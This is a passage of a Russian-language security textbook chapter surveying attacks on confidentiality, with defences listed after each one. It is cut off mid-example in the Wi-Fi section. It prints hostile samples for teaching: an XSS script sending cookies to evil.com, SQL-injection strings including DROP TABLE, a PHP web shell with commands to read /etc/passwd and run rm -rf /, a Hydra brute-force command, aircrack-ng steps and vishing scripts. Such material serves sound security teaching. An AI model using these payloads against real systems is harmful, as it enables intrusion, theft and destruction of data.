[← К оглавлению](README.md)

---

# [Глава 9.5](09_05_способы_нарушения_атаки.md). Способы нарушения конфиденциальности. Атаки

## Введение: Как хакеры ломают твою оборону (спойлер: через твою тупость)

Окей, дружище, в [Глава 9.04](09_04_противодействие_нарушениям.md) мы разобрали, **как защищаться** от утечек данных: шифрование, DLP, MFA, обучение персонала, SIEM. Теперь посмотрим на другую сторону баррикад: **как злоумышленники обходят всю эту защиту и добираются до твоих секретов**.

**Суровая правда**: В 99% случаев хакеры не ломают шифрование (это слишком сложно и долго). Они используют **более дешёвые способы**:

1. **Социальная инженерия** — обманом заставить тебя самого отдать пароль
2. **Фишинг** — прислать письмо «от банка» и украсть учётные данные
3. **Эксплуатация уязвимостей** — найти дырку в софте (SQL-инъекция, XSS, переполнение буфера)
4. **Перехват трафика** — подслушать незашифрованную связь (HTTP вместо HTTPS)
5. **Вредоносное ПО** — установить шпионскую программу (кейлоггер, троян, ransomware)
6. **Атаки на пароли** — подобрать слабый пароль (brute force, словарь)
7. **Инсайдеры** — сотрудник сливает данные (за деньги или по глупости)

**Статистика**:
- **82%** утечек данных — из-за **человеческого фактора** (Verizon DBIR 2023)
- **91%** кибератак начинаются с **фишинга** (Proofpoint, 2022)
- **60%** компаний взломали через **уязвимость в стороннем ПО** (Ponemon Institute, 2023)
- Средняя стоимость одной успешной кибератаки: **$4.45 миллиона** (IBM, 2023)

**Почему защита не работает?**

Потому что **злоумышленники ищут самое слабое звено**. Даже если у тебя идеальное шифрование и файрволл, хакер найдёт:
- Сотрудника, который кликнет на фишинг
- Админа с дефолтным паролем
- Уязвимость в WordPress-плагине
- Открытый порт, о котором забыли

**Закон безопасности**: *Система безопасна настолько, насколько безопасно её самое слабое звено.*

**В этой главе мы разберём:**
- **Социальная инженерия** (фишинг, претекстинг, бейтинг, quid pro quo)
- **Атаки на пароли** (brute force, словарь, rainbow tables, credential stuffing)
- **Сетевые атаки** (MITM, сниффинг, spoofing, DDoS)
- **Атаки на веб-приложения** (SQL-инъекция, XSS, CSRF, RCE)
- **Вредоносное ПО** (вирусы, черви, трояны, ransomware, spyware, rootkit)
- **Атаки на Wi-Fi** (взлом WEP/WPA2, Evil Twin, деаутентификация)
- **Физический доступ** (кража устройств, shoulder surfing, USB drop)
- **Реальные примеры** (Target 2013, Sony 2014, NotPetya 2017, SolarWinds 2020, Twitter hack 2020)

Эта глава связана с:
- **Главой 9.03 (Угрозы ИБ)** — там мы говорили об угрозах, тут — о способах их реализации
- **Главой 9.04 (Противодействие)** — там защита, тут — атаки
- **Главой 9.06 (Методы реализации угроз)** — там технические детали, тут — обзор
- **Главой 9.02 (Криптография)** — атаки на слабое шифрование
- **Главой 8.04 (Протоколы Internet)** — сетевые атаки (MITM, DDoS)

---

## 9.5.1. Социальная инженерия: Как обмануть мозг вместо компьютера

**Определение**: **Социальная инженерия** — манипуляция людьми с целью выманить конфиденциальную информацию или заставить выполнить нужные действия.

**Почему это работает?** Потому что **люди — самое слабое звено** в безопасности. Легче обмануть человека, чем взломать AES-256.

**Психологические триггеры**, которые используют злоумышленники:
1. **Доверие к авторитету** — «Я из IT-отдела, срочно нужен ваш пароль»
2. **Срочность** — «Ваш аккаунт заблокируют через 1 час, кликните сюда»
3. **Страх** — «Обнаружена подозрительная активность, подтвердите личность»
4. **Жадность** — «Вы выиграли iPhone, введите номер карты для доставки»
5. **Любопытство** — «Посмотрите, кто разместил ваше фото без одежды» (ссылка на вирус)

---

### Фишинг (Phishing)

**Определение**: Отправка поддельных email/SMS/сообщений, которые маскируются под легитимные (банк, соцсеть, начальник), чтобы украсть учётные данные или установить вирус.

**Типы фишинга**:

1. **Email-фишинг** (массовая рассылка):
   - Цель: поймать хотя бы 0.1% получателей
   - Пример: «Ваш аккаунт Netflix заблокирован, обновите платёжные данные»
   - Ссылка ведёт на поддельный сайт `netfllx.com` (заметил двойную L?)

2. **Spear Phishing** (целевой фишинг):
   - Атака на конкретного человека (CEO, бухгалтера, админа)
   - Злоумышленник изучает жертву (LinkedIn, соцсети) и подстраивает письмо
   - Пример: «Привет, Иван! Помнишь, мы встречались на конференции DevOps в Москве? Вот презентация...» (ссылка на вирус)

3. **Whaling** (охота на китов):
   - Фишинг на топ-менеджеров (CEO, CFO)
   - Цель: получить доступ к критичным системам или финансам
   - Пример: Злоумышленник притворяется юристом: «Срочно подпишите контракт» (PDF со встроенным эксплойтом)

4. **Smishing** (SMS-фишинг):
   - Фишинг через SMS
   - Пример: «Ваша посылка ожидает в пункте выдачи, трек-код: [ссылка]» (ссылка на установку Android-трояна)

5. **Vishing** (Voice Phishing):
   - Фишинг по телефону
   - Злоумышленник звонит: «Здравствуйте, служба безопасности банка. На вашей карте подозрительная операция, назовите CVV для блокировки»
   - Жертва называет CVV → хакер списывает деньги

**Признаки фишинга**:
- Подозрительный домен: `paypa1.com` (единица вместо L), `amazon-security.tk`
- Грамматические ошибки: «Ваш аккаунт был взлмоан»
- Паника и срочность: «Подтвердите в течение 1 часа, иначе...»
- Просьба ввести пароль/CVV/номер карты
- Вложение с подозрительным расширением: `invoice.pdf.exe`

**Реальный пример — Twitter hack 2020**:

В июле 2020 хакеры взломали аккаунты **Barack Obama, Elon Musk, Bill Gates, Apple, Uber** и разместили фишинговое сообщение: «Doubling all payments sent to this Bitcoin address» (отправь биткоины, получишь вдвое больше — классический скам).

**Как это произошло?**
- Хакеры позвонили сотрудникам Twitter, представившись из IT-отдела (vishing)
- Выманили учётные данные для внутренней панели управления
- Получили доступ к инструменту сброса паролей
- Украли **$120,000** в биткоинах за несколько часов

**Вывод**: Даже топовые компании уязвимы, если сотрудники не обучены распознавать фишинг.

---

### Претекстинг (Pretexting)

**Определение**: Создание ложного сценария (предлога) для выманивания информации.

**Отличие от фишинга**: Фишинг — массовая атака, претекстинг — целевая, с подробной легендой.

**Пример 1 — Звонок «из IT-отдела»**:
```
Злоумышленник (по телефону): «Здравствуйте, я Сергей из технической поддержки. 
                              У нас сбой на сервере, нужно проверить ваш аккаунт. 
                              Назовите, пожалуйста, ваш пароль для диагностики.»
Жертва: «Мой пароль — IvanPetrov2023»
```

**Пример 2 — Звонок «из банка»**:
```
Злоумышленник: «Добрый день, служба безопасности Сбербанка. 
                По вашей карте прошла подозрительная операция на 50,000₽. 
                Это были вы?»
Жертва: «Нет!»
Злоумышленник: «Тогда срочно назовите CVC-код на обороте карты, чтобы заблокировать операцию.»
Жертва (в панике): «123» (называет код)
```

**Защита**:
- **Никогда не называй пароли/CVV** по телефону — легитимные компании НИКОГДА не просят этого
- Перезвони в банк/компанию по официальному номеру с сайта
- Спроси у «сотрудника» внутренний номер и перезвони через секретаря

---

### Бейтинг (Baiting)

**Определение**: Атака, основанная на **любопытстве или жадности** жертвы. Злоумышленник «подбрасывает приманку» (физическую или виртуальную).

**Пример 1 — USB Drop Attack**:
- Хакер оставляет USB-флешки с надписью «Зарплаты 2025» или «Конфиденциально» на парковке офиса
- Любопытный сотрудник подбирает флешку и вставляет в рабочий компьютер
- Флешка автозапускает вирус → хакер получает доступ к корпоративной сети

**Реальный пример — Stuxnet (2010)**:
- Вирус **Stuxnet** (кибероружие США/Израиля против иранской ядерной программы) распространялся через USB-флешки
- Хакеры подбросили заражённые флешки рядом с иранским ядерным объектом
- Сотрудники принесли флешки внутрь (объект изолирован от интернета — air gap)
- Stuxnet вывел из строя центрифуги по обогащению урана

**Пример 2 — Поддельный Wi-Fi**:
- В кафе создаётся точка доступа `Starbucks_Free_WiFi` (рядом с настоящим `Starbucks_WiFi`)
- Жертвы подключаются → хакер перехватывает трафик (MITM)

**Защита**:
- **Не подключай неизвестные USB** (даже если написано «Секретное видео»)
- Отключи автозапуск USB в настройках ОС
- Используй VPN в публичных Wi-Fi

---

### Quid Pro Quo (Услуга за услугу)

**Определение**: Обещание выгоды в обмен на информацию.

**Пример**:
```
Злоумышленник звонит в компанию:
«Здравствуйте, мы проводим бесплатное обновление антивируса для всех сотрудников. 
 Чтобы установить, мне нужен удалённый доступ к вашему компьютеру на 5 минут.»
```
- Жертва даёт доступ → хакер устанавливает бэкдор

**Защита**:
- **Никогда не давай удалённый доступ** незнакомцам
- Проверяй запросы у своего IT-отдела

---

### Tailgating / Piggybacking (Проникновение вслед)

**Определение**: Физическое проникновение в защищённую зону, следуя за легитимным пользователем.

**Пример**:
- Хакер стоит у входа в офис с коробкой кофе или ноутбуком в руках
- Сотрудник прикладывает бейдж и открывает дверь
- Хакер: «Спасибо!» (проходит следом)
- Сотрудник не задаёт вопросов (вежливость / предполагает, что хакер — коллега)

**Реальный пример**:
- В 2018 тестировщики безопасности (ethical hackers) проникли в **19 из 21 банка** США, просто идя следом за сотрудниками

**Защита**:
- **Не пропускай незнакомых** (даже если неудобно отказать)
- Установи турникеты с контролем одного прохода
- Обязательные бейджи для всех

---

## 9.5.2. Атаки на пароли: Когда `123456` — худший выбор в жизни

Пароли — первая линия обороны. Но **61%** пользователей используют один и тот же пароль на всех сайтах (Google, 2019). **Это пиздец, товарищи.**

---

### Brute Force (Перебор)

**Определение**: Систематический перебор всех возможных комбинаций пароля.

**Как работает:**
```python
passwords = ['a', 'b', 'c', ..., 'zzzzz']  # Все комбинации
for password in passwords:
    if try_login('admin', password):
        print(f"Пароль найден: {password}")
        break
```

**Сложность**:
- Пароль `1234` (4 цифры): 10^4 = 10,000 комбинаций → взломают за секунды
- Пароль `Pa$$w0rd` (8 символов, буквы + цифры + спецсимволы): 95^8 = 6.6 квадриллионов комбинаций
  - При скорости 1 миллион попыток/сек: **209 лет**
  - При скорости 100 миллиардов попыток/сек (GPU-кластер): **21 час**

**Таблица времени взлома паролей (GPU RTX 4090, 100 млрд/сек)**:

| Длина | Только цифры | Буквы (a-z) | Буквы + цифры | Буквы + цифры + спецсимволы |
|-------|--------------|-------------|---------------|------------------------------|
| 4     | 0.0001 сек   | 0.5 сек     | 1 сек         | 3 сек                        |
| 6     | 0.01 сек     | 5 мин       | 30 мин        | 6 часов                      |
| 8     | 1 сек        | 5 дней      | 2 месяца      | 21 час                       |
| 10    | 2 мин        | 3 года      | 200 лет       | 92 года                      |
| 12    | 3 часа       | 2000 лет    | 400,000 лет   | 500,000 лет                  |

**Вывод**: Минимум **12 символов** с буквами + цифры + спецсимволы. Идеально — **16+**.

**Защита от brute force**:
- **Rate limiting**: блокировка IP после 5 неудачных попыток
- **CAPTCHA** после 3 попыток
- **Account lockout**: блокировка аккаунта на 30 минут после 10 попыток
- **MFA** (Multi-Factor Authentication) — даже если пароль подобрали, нужен ещё код из SMS/приложения

---

### Dictionary Attack (Словарная атака)

**Определение**: Перебор паролей из **списка популярных паролей** (словаря).

**Откуда берутся словари?**
- Утечки баз данных (RockYou 2009: 32 млн паролей)
- Топ-1000 популярных паролей
- Слова из словаря (password, qwerty, letmein)
- Имена + даты: `john1990`, `maria2000`

**Топ-10 паролей в 2023 году** (NordPass):
1. `123456` (100 млн пользователей)
2. `admin`
3. `12345678`
4. `123456789`
5. `1234`
6. `12345`
7. `password`
8. `123`
9. `Aa123456`
10. `1234567890`

**Пример словарной атаки**:
```bash
# Hydra — инструмент для брутфорса SSH
hydra -l admin -P passwords.txt ssh://192.168.1.10
# -l admin — логин
# -P passwords.txt — словарь паролей (1 млн строк)
# Если пароль "password" в словаре → взломают за минуты
```

**Защита**:
- **Не используй популярные пароли**
- Пароли не должны быть словами из словаря
- Менеджер паролей (генерирует `Kj8$mQ#2vL9pXz` вместо `password123`)

---

### Rainbow Tables (Радужные таблицы)

**Определение**: Предвычисленные таблицы хешей паролей для ускорения взлома.

**Как работает:**

Обычно пароли хранятся в виде хешей ([Глава 9.02](09_02_криптографические_методы.md)):
```
Пароль: password → SHA-256 → 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
```

Хакер не может расшифровать хеш (SHA-256 — односторонняя функция). Но может **перебрать** все пароли и сравнить хеши:
```
password → хеш 5e8848...
admin    → хеш 8c6976...
123456   → хеш e10adc...
```

Но это долго. **Rainbow Table** — это готовая таблица:
```
password → 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
admin    → 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
123456   → e10adc3949ba59abbe56e057f20f883e
```

**Размер rainbow table для всех 8-символьных паролей (буквы+цифры)**:
- Комбинаций: 62^8 = 218 триллионов
- Размер таблицы: **~7 петабайт** (7000 терабайт)

**Защита — соль (Salt)**:

К паролю добавляется случайная строка перед хешированием:
```
Пароль: password
Соль (для пользователя 1): x9Kq2mL
Итоговый хеш: SHA256("password" + "x9Kq2mL") → уникальный хеш
```

Даже если у двух пользователей одинаковый пароль `password`, хеши будут разные (из-за разных солей). **Rainbow table бесполезна** — для каждого пользователя нужна своя таблица.

**Современные алгоритмы с солью**: bcrypt, Argon2, PBKDF2 ([Глава 9.02](09_02_криптографические_методы.md)).

---

### Credential Stuffing (Подстановка учётных данных)

**Определение**: Использование **украденных логинов/паролей** с одного сайта для взлома аккаунтов на других сайтах.

**Как работает:**
1. Хакер покупает базу утечки с 10 млн email/password (например, утечка LinkedIn 2012)
2. Автоматически пробует эти пары на других сайтах (Netflix, Gmail, Amazon)
3. **53% пользователей** используют один и тот же пароль везде → миллионы аккаунтов скомпрометированы

**Реальный пример — Disney+ 2019**:
- Сразу после запуска Disney+ тысячи аккаунтов взломали
- Причина: пользователи использовали **тот же email/пароль**, что и на других сайтах (которые утекли раньше)
- Хакеры продавали доступы к Disney+ по $3 на чёрном рынке

**Защита**:
- **Уникальный пароль для каждого сайта** (менеджер паролей: Bitwarden, 1Password)
- Проверь, утекал ли твой пароль: [haveibeenpwned.com](https://haveibeenpwned.com)
- MFA везде, где возможно

---

## 9.5.3. Сетевые атаки: Когда хакер — твой сосед по Wi-Fi

---

### Man-in-the-Middle (MITM) — Атака посредника

**Определение**: Злоумышленник перехватывает трафик между двумя сторонами (клиент ↔ сервер), подслушивает и может модифицировать данные.

**Как работает:**
```
Ты      →  [Хакер]  →  Gmail
        ←  [Хакер]  ←
```

**Пример — публичный Wi-Fi в кафе**:
1. Ты подключаешься к `Starbucks_WiFi`
2. Хакер сидит с ноутбуком и запустил **ARP Spoofing** (обманул роутер, что его MAC-адрес = адрес роутера)
3. Теперь весь твой трафик идёт через ноутбук хакера
4. Ты заходишь на `http://mybank.com` (не HTTPS!) → хакер видит логин/пароль
5. Даже если HTTPS, хакер может попытаться **SSL Stripping** (подменить HTTPS на HTTP)

**Инструменты для MITM**:
- **Ettercap** — ARP spoofing
- **Wireshark** — перехват пакетов
- **mitmproxy** — прокси для перехвата HTTPS

**Реальный пример — Lenovo Superfish (2015)**:
- Lenovo предустановила на ноутбуки рекламное ПО **Superfish**
- Оно перехватывало HTTPS-трафик (устанавливало свой корневой сертификат)
- Рекламодатели могли внедрять рекламу даже на зашифрованные страницы
- Но Superfish имел **единый приватный ключ** на всех ноутбуках → хакеры расшифровали его → могли делать MITM на **любом Lenovo с Superfish**

**Защита**:
- Используй только **HTTPS** (особенно в публичных Wi-Fi)
- Установи расширение **HTTPS Everywhere** (автоматически переключает на HTTPS)
- **VPN** в публичных сетях (шифрует весь трафик)
- Проверяй SSL-сертификаты (если браузер показывает предупреждение — уходи с сайта)

---

### Packet Sniffing (Перехват пакетов)

**Определение**: Прослушивание трафика в сети.

**Как работает:**
- В Wi-Fi все пакеты передаются по воздуху → можно перехватить (если Wi-Fi без шифрования)
- Даже в проводной сети (Ethernet) можно перехватить, если доступ к свитчу

**Инструменты**:
- **Wireshark** — перехват и анализ пакетов
- **tcpdump** — консольный сниффер

**Что можно перехватить:**
- HTTP-запросы (логины/пароли)
- Email (POP3, IMAP без SSL)
- FTP-логины
- DNS-запросы (какие сайты посещал пользователь)

**Защита**:
- **Шифруй всё** (HTTPS, SSH, VPN)
- WPA3 для Wi-Fi (вместо WPA2 или, боже упаси, WEP)

---

### IP Spoofing (Подмена IP-адреса)

**Определение**: Подделка исходящего IP-адреса в пакетах.

**Зачем:**
- Скрыть источник атаки
- Обойти файрвол (если он доверяет определённым IP)
- DDoS (Distributed Denial of Service) — усилить атаку

**Пример — Smurf Attack**:
1. Хакер отправляет **ICMP Echo Request** (ping) на broadcast-адрес сети `192.168.1.255`
2. Но исходящий IP подделан → указан IP жертвы `10.0.0.5`
3. Все устройства в сети `192.168.1.x` отвечают на ping → отправляют ответы на `10.0.0.5`
4. Жертва получает тысячи ICMP-ответов → перегрузка (DoS)

**Защита**:
- **Ingress filtering** (блокировать пакеты с поддельным source IP)
- Не использовать broadcast в сети

---

### DDoS (Distributed Denial of Service) — Распределённая атака отказа в обслуживании

**Определение**: Перегрузка сервера огромным количеством запросов с целью сделать сайт недоступным.

**Как работает:**
```
Ботнет (100,000 заражённых компьютеров) 
   → одновременно отправляют запросы на твой сайт 
   → сервер не справляется → сайт падает
```

**Типы DDoS**:

1. **Volumetric Attack** (объёмная атака):
   - Цель: забить канал трафиком
   - Пример: UDP flood (отправка гигабайтов UDP-пакетов)
   - Мощность: 1 Тбит/сек (GitHub DDoS 2018)

2. **Protocol Attack** (атака на протоколы):
   - Цель: исчерпать ресурсы сервера (CPU, память)
   - Пример: **SYN Flood** (отправка тысяч TCP SYN, но не завершение рукопожатия → сервер держит полуоткрытые соединения → память кончается)

3. **Application Layer Attack** (атака на приложение):
   - Цель: перегрузить веб-приложение
   - Пример: отправка запросов на тяжёлую страницу (поиск по БД) → сервер тратит CPU на обработку → падает

**Реальный пример — GitHub DDoS 2018**:
- **1.35 Тбит/сек** трафика (рекорд на тот момент)
- Использовали **Memcached Amplification Attack** (отправка запроса на Memcached-серверы → они отвечают в 50,000 раз больше данных → весь ответ летит на GitHub)
- GitHub использовал **Cloudflare** (защита от DDoS) → атаку отбили за 10 минут

**Защита**:
- **CDN** (Content Delivery Network): Cloudflare, Akamai (распределяют трафик по дата-центрам)
- **Rate limiting** (ограничение запросов с одного IP)
- **WAF** (Web Application Firewall) — блокирует подозрительные запросы
- **Anycast** (один IP → несколько серверов по миру → трафик распределяется)

---

### DNS Spoofing / DNS Cache Poisoning (Отравление кэша DNS)

**Определение**: Подмена DNS-записи, чтобы пользователь попал на фальшивый сайт.

**Как работает:**
1. Ты вводишь `google.com` в браузере
2. Компьютер спрашивает DNS-сервер: «Какой IP у google.com?»
3. Хакер перехватывает запрос и подсунул фейковый ответ: `google.com → 6.6.6.6` (IP хакера)
4. Браузер открывает сайт на `6.6.6.6` → это поддельная страница Google, крадущая пароли

**Реальный пример — DNS Hijacking в Бразилии (2018)**:
- Хакеры взломали роутеры пользователей и изменили DNS-сервер на свой
- Когда пользователи заходили на банковские сайты → попадали на фишинговые копии
- Украдены десятки тысяч учётных данных

**Защита**:
- **DNSSEC** (цифровые подписи для DNS-записей)
- Использовать публичные DNS (Google `8.8.8.8`, Cloudflare `1.1.1.1`)
- Проверять SSL-сертификат (если сайт банка показывает недействительный сертификат → это фейк)

---

## 9.5.4. Атаки на веб-приложения: Когда программист забыл проверить ввод

---

### SQL Injection (SQL-инъекция)

**Определение**: Внедрение вредоносного SQL-кода в запрос к базе данных.

**Как работает:**

Плохой код (уязвим к SQL-инъекции):
```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

Обычный вход:
```
username: admin
password: secret
SQL: SELECT * FROM users WHERE username='admin' AND password='secret'
```

**Атака**:
```
username: admin' OR '1'='1' --
password: anything
SQL: SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
```

Что происходит:
- `OR '1'='1'` — всегда истина → условие выполнено
- `--` — комментарий в SQL, всё после него игнорируется
- Результат: **вход без пароля**

**Ещё хуже:**
```
username: admin'; DROP TABLE users; --
SQL: SELECT * FROM users WHERE username='admin'; DROP TABLE users; --'
```
→ **Таблица users удалена**

**Реальный пример — 2008, Heartland Payment Systems**:
- SQL-инъекция в платёжной системе
- Украдено **130 миллионов** номеров кредитных карт
- Ущерб: **$140 миллионов**

**Защита**:
- **Prepared Statements** (параметризованные запросы):
  ```php
  $stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
  $stmt->execute([$username, $password]);
  ```
- **ORM** (Object-Relational Mapping): Hibernate, Django ORM — автоматически экранируют спецсимволы
- **Валидация ввода** (проверка, что username содержит только буквы/цифры)

---

### Cross-Site Scripting (XSS)

**Определение**: Внедрение вредоносного JavaScript-кода на сайт.

**Как работает:**

Сайт с комментариями (без фильтрации ввода):
```html
<form action="/post_comment" method="POST">
  <textarea name="comment"></textarea>
  <button type="submit">Отправить</button>
</form>
```

Хакер отправляет комментарий:
```html
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
```

Теперь каждый, кто откроет страницу с этим комментарием, выполнит этот скрипт → его cookie (включая сессию) отправятся хакеру.

**Типы XSS**:

1. **Reflected XSS** (отражённая):
   - Вредоносный код в URL: `http://site.com/search?q=<script>alert('XSS')</script>`
   - Сайт отображает параметр `q` на странице → скрипт выполняется

2. **Stored XSS** (хранимая):
   - Вредоносный код сохранён в БД (комментарий, профиль пользователя)
   - Каждый, кто откроет страницу, выполнит скрипт

3. **DOM-based XSS**:
   - JavaScript на странице динамически изменяет DOM, используя непроверенные данные
   - Пример:
     ```javascript
     document.getElementById('welcome').innerHTML = "Привет, " + location.hash;
     ```
     URL: `http://site.com#<img src=x onerror=alert('XSS')>` → скрипт выполнится

**Реальный пример — MySpace Samy Worm (2005)**:
- Подросток Samy Kamkar внедрил XSS в свой профиль MySpace
- Код добавлял в друзья всех, кто посетит его профиль, и копировал себя на их страницы
- За **20 часов** заразил **1 миллион профилей** (самый быстрорастущий вирус в истории)
- MySpace пришлось закрыть сайт на сутки для очистки

**Защита**:
- **Экранирование ввода** (заменить `<` на `&lt;`, `>` на `&gt;`)
- **Content Security Policy (CSP)** — заголовок, запрещающий выполнение inline-скриптов:
  ```
  Content-Security-Policy: script-src 'self'
  ```
- Использовать фреймворки с автоэкранированием (React, Vue, Django templates)

---

### Cross-Site Request Forgery (CSRF) — Подделка запросов

**Определение**: Атака, при которой злоумышленник заставляет жертву выполнить нежелательное действие на сайте, где она авторизована.

**Как работает:**

1. Ты залогинен в онлайн-банке `mybank.com` (cookie с сессией сохранён в браузере)
2. Хакер присылает тебе email с картинкой:
   ```html
   <img src="http://mybank.com/transfer?to=hacker&amount=1000000">
   ```
3. Браузер автоматически загружает картинку → отправляет GET-запрос на `mybank.com`
4. Сервер видит твою валидную сессию (cookie) → выполняет перевод **$1,000,000** хакеру

**Защита**:
- **CSRF-токен** — случайная строка, проверяемая на сервере:
  ```html
  <form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="x9Kq2mL7...">
    <input name="amount" value="100">
    <button type="submit">Перевести</button>
  </form>
  ```
  Хакер не знает токен → не может подделать форму
- **SameSite Cookie** — атрибут, запрещающий отправку cookie с других доменов:
  ```
  Set-Cookie: session=abc123; SameSite=Strict
  ```

---

### Remote Code Execution (RCE) — Удалённое выполнение кода

**Определение**: Уязвимость, позволяющая выполнить произвольный код на сервере.

**Пример — уязвимость в загрузке файлов**:

Сайт позволяет загружать аватары (PNG/JPG). Но не проверяет расширение файла.

Хакер загружает файл `avatar.php`:
```php
<?php system($_GET['cmd']); ?>
```

Теперь хакер может выполнить любую команду:
```
http://site.com/uploads/avatar.php?cmd=ls
http://site.com/uploads/avatar.php?cmd=cat /etc/passwd
http://site.com/uploads/avatar.php?cmd=rm -rf /
```

**Реальный пример — Equifax 2017**:
- RCE в Apache Struts (Java-фреймворк)
- Хакеры выполнили команды на сервере → украли 147 млн записей

**Защита**:
- Проверка типа файла (не только расширение, но и MIME-type + содержимое)
- Переименовывать загруженные файлы (не сохранять как `avatar.php`, а как `abc123.jpg`)
- Запретить выполнение скриптов в папке загрузок

---

## 9.5.5. Вредоносное ПО: Когда твой компьютер работает на хакера

---

### Вирус

**Определение**: Программа, которая **копирует себя** в другие файлы.

**Как работает:**
- Прикрепляется к легитимному exe-файлу (`game.exe`)
- Когда пользователь запускает `game.exe` → вирус активируется → заражает другие файлы

**Ущерб:**
- Удаление файлов
- Повреждение загрузочного сектора
- Кража данных

**Пример — ILOVEYOU (2000)**:
- Вирус распространялся через email с темой «ILOVEYOU»
- Вложение: `LOVE-LETTER-FOR-YOU.txt.vbs` (на самом деле VBScript)
- При открытии заражал компьютер и рассылал себя всем контактам
- Ущерб: **$10 миллиардов**

---

### Червь (Worm)

**Определение**: Самораспространяющаяся программа (не нужен носитель, в отличие от вируса).

**Отличие от вируса:** Вирус заражает файлы, червь — сам перемещается по сети.

**Пример — WannaCry (2017)**:
- Ransomware-червь (шифрует файлы + требует выкуп)
- Использовал уязвимость **EternalBlue** (эксплойт NSA для Windows SMB)
- Заразил **300,000 компьютеров** в 150 странах за 1 день
- Пострадали: NHS (британская медицина, отменили операции), Renault (остановка заводов), FedEx, Deutsche Bahn
- Требовал выкуп: **$300 в биткоинах**
- Остановлен случайно: исследователь нашёл «kill switch» (домен в коде вируса, регистрация которого останавливала распространение)

**Защита:**
- Обновлять ОС (Microsoft выпустила патч за 2 месяца до WannaCry, но многие не обновились)
- Отключить SMBv1 (устаревший протокол)

---

### Троян (Trojan)

**Определение**: Вредоносная программа, **маскирующаяся под легитимную**.

**Примеры:**
- Приложение «Бесплатный антивирус» → на самом деле крадёт пароли
- Взломанная игра (`GTA5_crack.exe`) → устанавливает бэкдор
- Fake Flash Player Update → устанавливает adware

**Типы троянов:**
1. **Backdoor** — создаёт удалённый доступ для хакера
2. **Keylogger** — записывает нажатия клавиш (крадёт пароли)
3. **Banker** — крадёт данные онлайн-банкинга
4. **RAT (Remote Access Trojan)** — полный контроль над компьютером (веб-камера, микрофон, файлы)

**Реальный пример — Emotet (2014-2021)**:
- Троян-банкер, ставший «платформой для других вирусов»
- Распространялся через фишинговые email с макросами Word
- Устанавливал дополнительные вирусы (TrickBot, Ryuk ransomware)
- Ущерб: **$2.5 миллиарда**
- Ликвидирован в 2021 совместной операцией Europol

---

### Ransomware (Вымогатель)

**Определение**: Вирус, **шифрующий файлы** и требующий выкуп за расшифровку.

**Как работает:**
1. Вирус попадает на компьютер (email, взлом RDP, уязвимость)
2. Шифрует все файлы **AES-256** (документы, фото, базы данных)
3. Показывает сообщение:
   ```
   Ваши файлы зашифрованы!
   Заплатите 1 BTC на адрес bc1q... в течение 72 часов.
   Иначе файлы будут удалены навсегда.
   ```

**Примеры:**

1. **CryptoLocker (2013)**:
   - Первый массовый ransomware
   - Заразил 500,000 компьютеров
   - Выкуп: $300-$2000
   - Создатели заработали **$3 миллиона** за несколько месяцев

2. **Colonial Pipeline (2021)**:
   - Ransomware **DarkSide** зашифровал серверы крупнейшего топливопровода США
   - Остановка поставок бензина на восточное побережье → паника, очереди на заправках
   - Выкуп: **$4.4 миллиона** в биткоинах (потом ФБР вернули $2.3 млн)

3. **NotPetya (2017)**:
   - Маскировался под ransomware, но **цель — уничтожение** (невозможно расшифровать файлы, даже заплатив)
   - Атака на Украину (через обновление бухгалтерской программы M.E.Doc)
   - Распространился на международные компании: Maersk (судоходство, потеряли $300 млн), Merck (фармацевтика, $870 млн), FedEx ($400 млн)
   - Общий ущерб: **$10 миллиардов** (самая разрушительная кибератака в истории)

**Защита:**
- **Backup** (правило 3-2-1: 3 копии, 2 носителя, 1 offsite)
- Не открывать подозрительные вложения
- Обновлять ОС и ПО
- Отключить макросы в Office по умолчанию
- Сегментировать сеть (ransomware не должен распространиться на все компьютеры)

---

### Spyware (Шпионское ПО)

**Определение**: Программа, **собирающая информацию** о пользователе без его ведома.

**Что собирает:**
- История браузера
- Пароли (из сохранённых в браузере)
- Скриншоты
- Нажатия клавиш (keylogger)
- Данные банковских карт

**Пример — Pegasus (NSO Group)**:
- Шпионское ПО для iOS/Android
- Использовалось спецслужбами для слежки за журналистами, активистами
- Может: читать сообщения, слушать звонки, включать камеру/микрофон, отслеживать GPS
- Заражение: через **zero-click exploit** (не нужно кликать на ссылку — достаточно получить iMessage)

**Защита:**
- Антивирус
- Не устанавливать приложения из неизвестных источников
- Регулярно проверять список установленных программ

---

### Rootkit

**Определение**: Вредоносное ПО, **скрывающее своё присутствие** в системе.

**Как работает:**
- Заменяет системные утилиты (`ls`, `ps`, `netstat`) на модифицированные версии, которые скрывают файлы/процессы rootkit
- Пользователь запускает `ps` → видит обычные процессы → rootkit не виден

**Типы:**
1. **User-mode rootkit** — работает на уровне приложений (легче обнаружить)
2. **Kernel-mode rootkit** — внедряется в ядро ОС (очень сложно обнаружить)
3. **Bootkit** — заражает загрузчик (запускается ДО операционной системы)

**Пример — Sony BMG Rootkit (2005)**:
- Sony встроила rootkit в музыкальные CD для защиты от копирования
- Rootkit устанавливался автоматически при вставке CD в Windows
- Скрывал файлы, начинающиеся с `$sys$`
- Хакеры использовали это для скрытия своих вирусов (называли файлы `$sys$trojan.exe`)
- Скандал → Sony отозвала 5.7 млн дисков

**Защита:**
- Использовать **UEFI Secure Boot** (проверка подписи загрузчика)
- Антивирусы с проверкой на руткиты (Kaspersky, Malwarebytes)
- Переустановка ОС (иногда единственный способ)

---

## 9.5.6. Атаки на Wi-Fi: Как твой сосед крадёт Netflix

---

### Взлом WEP (Wired Equivalent Privacy)

**Почему WEP устарел:**
- Использует **RC4** (слабое шифрование)
- Можно взломать за **5 минут** с помощью **aircrack-ng**

**Как работает взлом:**
```bash
# 1. Перевести Wi-Fi-адаптер в режим мониторинга
airmon-ng start wlan0

# 2. Сканировать сети
airodump-ng wlan0mon

# 3. Перехватывать пакеты с целевой сети
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon

# 4. Подождать 50,000 пакетов (или ускорить, атакуя роутер)
# 5. Взломать ключ
